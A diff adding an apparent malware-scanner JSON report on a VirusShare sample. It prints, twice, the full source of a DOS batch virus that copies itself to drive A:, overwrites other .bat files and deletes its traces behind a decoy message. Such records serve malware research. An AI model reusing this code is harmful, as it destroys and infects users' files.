@@ -1,0 +1,58 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "command": "May run PowerShell commands"
+        },
+        "macro": "@echo off\nSET BN=\ufffd\ufffd\ufffd\ufffd\u09a8\ufffd\ufffd\ufffd\nSET ST=\"\ufffd\ufffd\u282b\ufffd\ufffd\ufffd\"\nset DD=A:\nif not exist %DD%\\*.* goto :END\n%DD%\ncd \\\ndir %0 /s | find /i %ST% > %DD%\\V.666\necho exit >> %DD%\\V.666\necho copy %%2\\%0 %DD%\\ > %DD%\\%BN%.bat\ncommand <  V.666  > nul\ndir /ad /s | find /i %ST% > V.666\necho exit >> V.666\necho cd %%2 > %DD%\\%BN%.bat\necho if exist %BN%.bat goto :END >> %DD%\\%BN%.bat\necho if exist *.bat for %%%%F in (*.bat) do copy %DD%\\%0 %%%%F >> %DD%\\%BN%.bat\necho if not exist *.bat copy %DD%\\%0 %%2 >> %DD%\\%BN%.bat\necho :END >> %DD%\\%BN%.bat\necho cd \\ >> %DD%\\%BN%.bat\ncommand < V.666 > nul\ndel V.666\ndel %BN%.bat\ndel %DD%\\%0\n:END\n@echo Good command or file name!"
+    },
+    "filename": "VirusShare_a18cafcbd4a665fed2a0dc71a710ff75",
+    "filesize": 666,
+    "filetype": "DOS batch file, Non-ISO extended-ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "a18cafcbd4a665fed2a0dc71a710ff75",
+        "sha1": "61ad7212615f3f7d83ba8555b76a0e73b7114b94",
+        "sha256": "d88766689089d02bd9e720800d7793e62f310e07022ef1f450909be6ebfebf2a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "SET BN=\u09a8",
+            "SET ST=\"\u282b\"",
+            "set DD=A:",
+            "if not exist %DD%\\*.* goto :END",
+            "%DD%",
+            "cd \\",
+            "dir %0 /s | find /i %ST% > %DD%\\V.666",
+            "echo exit >> %DD%\\V.666",
+            "echo copy %%2\\%0 %DD%\\ > %DD%\\%BN%.bat",
+            "command <  V.666  > nul",
+            "dir /ad /s | find /i %ST% > V.666",
+            "echo exit >> V.666",
+            "echo cd %%2 > %DD%\\%BN%.bat",
+            "echo if exist %BN%.bat goto :END >> %DD%\\%BN%.bat",
+            "echo if exist *.bat for %%%%F in (*.bat) do copy %DD%\\%0 %%%%F >> %DD%\\%BN%.bat",
+            "echo if not exist *.bat copy %DD%\\%0 %%2 >> %DD%\\%BN%.bat",
+            "echo :END >> %DD%\\%BN%.bat",
+            "echo cd \\ >> %DD%\\%BN%.bat",
+            "command < V.666 > nul",
+            "del V.666",
+            "del %BN%.bat",
+            "del %DD%\\%0",
+            ":END",
+            "@echo Good command or file name!"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.250768",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
